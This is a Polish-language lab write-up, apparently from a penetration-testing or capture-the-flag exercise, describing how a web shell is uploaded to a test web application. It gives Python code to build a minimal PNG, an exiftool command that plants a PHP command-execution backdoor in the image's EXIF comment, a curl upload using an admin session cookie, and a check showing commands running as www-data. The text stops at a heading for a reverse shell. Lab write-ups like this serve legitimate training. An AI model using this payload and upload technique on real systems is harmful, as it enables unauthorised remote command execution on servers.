## 4. Uploading Web Shell
### 4.1 Przygotowanie backdoora

Stworzono minimalny PNG 1x1 pixel za pomocą Pythona (aby uniknąć błędów składni PHP przy parsowaniu dużych plików binarnych):

```bash
python3 -c "
import zlib, struct
def create_png():
    sig = b'\x89PNG\r\n\x1a\n'
    ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data)
    ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
    raw = b'\x00\xff\xff\xff'
    compressed = zlib.compress(raw)
    idat_crc = zlib.crc32(b'IDAT' + compressed)
    idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)
    iend_crc = zlib.crc32(b'IEND')
    iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
    return sig + ihdr + idat + iend
with open('minimal.png', 'wb') as f:
    f.write(create_png())
"
```

Wstawiono PHP backdoor do komentarza EXIF obrazka:

```bash
exiftool -Comment='<?php system($_REQUEST["cmd"]); ?>' minimal.png
```

**Wynik:**
```
1 image files updated
```

### 4.2 Upload przez curl

Pobrano cookie sesji z Firefox (F12 → Storage → Cookies) po zalogowaniu jako `admin` / `p4ssw0rd`:

![alt text](/img/img3.png)

```
PHPSESSID=a5io7mfls2f9hq14km4qu30v55
```

Upload pliku z jednoczesnym sprawdzeniem czy pojawił się na liście:

```bash
curl -s -b "PHPSESSID=a5io7mfls2f9hq14km4qu30v55" \
  -F "title=backdoor" \
  -F "image=@minimal.png;type=image/png" \
  -F "Add=Add" \
  http://192.168.56.104/admin/index.php | grep -o 'show.php?id=[0-9]*' | tail -1
```

**Wynik:**

### 4.3 Weryfikacja webshella

```bash
curl -s --output - "http://192.168.56.104/admin/uploads/1778093530.png/cmd.php?cmd=id" | strings | grep uid
```

**Wynik:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
![alt text](/img/img6.png)

- uid=33(www-data) - to ID użytkownika. Nasz shell działa jako użytkownik www-data (ID 33), czyli konto pod którym działa serwer webowy nginx/PHP.

- gid=33(www-data) - to ID grupy głównej tego użytkownika. Należy do grupy www-data.

- groups=33(www-data) - lista wszystkich grup do których należy użytkownik. Należy tylko do jednej grupy - www-data.

**W praktyce oznacza to że mamy dostęp do serwera z uprawnieniami serwera webowego - możemy czytać i modyfikować pliki w /var/www/**

### 5.2 Wywołanie reverse shell przez webshell
